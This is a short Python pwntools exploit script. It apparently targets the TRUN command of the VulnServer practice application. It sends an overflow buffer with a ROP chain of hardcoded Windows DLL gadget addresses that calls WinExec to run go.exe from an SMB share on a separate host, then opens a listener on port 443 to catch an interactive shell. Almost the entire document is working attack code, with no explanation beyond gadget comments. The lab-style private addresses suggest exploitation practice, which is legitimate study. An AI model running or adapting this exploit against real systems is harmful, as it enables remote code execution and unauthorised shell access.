from pwn import *

#WinExec() - ROP
# UINT WINAPI WinExec(            => PTR to WinExec                                
#   __in  LPCSTR lpCmdLine,       => \\192.168.116.199\g\go.exe                    
#   __in  UINT uCmdShow           => 0x1                                           
# );
# PUSHAD method.
# -RET (taken from EDI)
# -RET (taken from ESI)
# -WinExec()   (taken from EBP)
# -Pointer to cmdline (auto magically inserted by pushad)
# -Zero  (taken from EBX)
# -EDX (junk)
# -ECX (junk)
# -EAX (junk)
# -nops
# -shellcode                                                                                    

rop = (
#EDI=ROPNOP
p32(0x77c47a41) + # POP EDI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
p32(0x7c82b93f) + # DEC ECX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}

#ESI=ROPNOP, EBP=WinExec()
p32(0x7c96fc15) + # MOV EAX,ESI # POP ESI # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
p32(0x7C8623AD) + # DEC ECX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
p32(0x7C8623AD) + # CALL WinExec() pointer

#PUSHAD automatically puts top of the stack address here: Place command after this PUSHAD block.

#EBX=0x0
p32(0x7c87b80c) + # POP EBX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
p32(0xffffffff) + # EBX=0xffffffff
p32(0x77c127e1) + # INC EBX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}

#PUSHAD
p32(0x77c12df9)   # PUSHAD # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
)

cmd = "\\\\192.168.116.199\\g\\go.exe &\x00"

poc = "TRUN /.:/"
poc += "A" * ((2003 + 9) - len(poc))
poc += rop
poc += cmd
poc += "D" * ((5000 + 9) - len(poc))

l = listen(443)

r = remote("192.168.116.178", 9999)
print str(r.recvline())
r.send(poc)
r.close()

l.recvline()
l.interactive()
l.close()
